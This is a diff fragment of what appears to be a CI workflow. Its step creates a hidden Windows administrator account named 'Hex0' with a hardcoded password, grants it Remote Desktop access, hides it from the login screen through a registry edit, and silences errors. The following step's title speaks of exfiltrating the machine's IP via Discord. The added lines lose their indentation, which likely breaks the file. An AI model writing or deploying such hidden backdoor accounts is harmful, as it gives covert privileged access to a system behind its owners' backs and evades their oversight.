@@ -18,10 +18,10 @@ jobs:
       - name: 2. Create Hidden Admin Account
         run: |
           $secpass = ConvertTo-SecureString "Hex0#2026" -AsPlainText -Force
-          New-LocalUser -Name "Hex0" -Password $secpass -PasswordNeverExpires -ErrorAction SilentlyContinue
-          Add-LocalGroupMember -Group "Administrators" -Member "Hex0"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Hex0"
-          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
+New-LocalUser -Name "Hex0" -Password $secpass -PasswordNeverExpires -ErrorAction SilentlyContinue
+Add-LocalGroupMember -Group "Administrators" -Member "Hex0" -ErrorAction SilentlyContinue
+Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Hex0" -ErrorAction SilentlyContinue
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
 
       - name: 3. Install Tailscale & Exfil IP (via Discord optional)
         env:
